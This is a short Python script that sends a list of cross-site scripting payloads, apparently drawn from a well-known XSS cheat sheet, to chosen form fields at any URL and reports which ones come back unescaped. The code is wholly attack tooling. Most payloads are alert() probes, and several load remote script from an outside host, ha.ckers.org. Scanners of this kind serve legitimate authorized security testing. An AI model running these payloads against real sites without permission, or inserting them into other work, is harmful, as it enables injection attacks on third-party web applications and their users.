import requests
import sys

def test_xss(url, fields):
    payloads = [
        "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode",
        "<script>alert('xss')</script>",
        "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "'';!--\"<XSS>=&{}()",
        "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=javascrscriptipt:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG \"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"",
        "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
        "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
        "\";alert('XSS');//",
        "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
        "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
        "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
        "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\">"
    ]

    for field in fields:
        for payload in payloads:
            r = requests.post(url, data={field: payload})

            if payload in r.text:
                print(f'XSS Vulnerability detected in {field} with payload: {payload}')


if __name__ == "__main__":
    url = sys.argv[1]  # The first command line argument is the URL
    fields = sys.argv[2:]  # The rest of the command line arguments are the fields

    test_xss(url, fields)